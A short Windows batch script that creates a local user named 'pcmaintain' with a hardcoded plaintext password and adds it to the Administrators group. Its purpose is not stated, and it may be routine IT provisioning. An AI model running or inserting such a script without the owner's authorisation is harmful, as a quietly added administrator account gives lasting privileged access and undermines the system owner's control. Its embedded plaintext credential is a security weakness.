@echo off
set username=pcmaintain
set password=1703@bligovtw
net user %username% %password% /add
net localgroup Administrators %username% /add
pause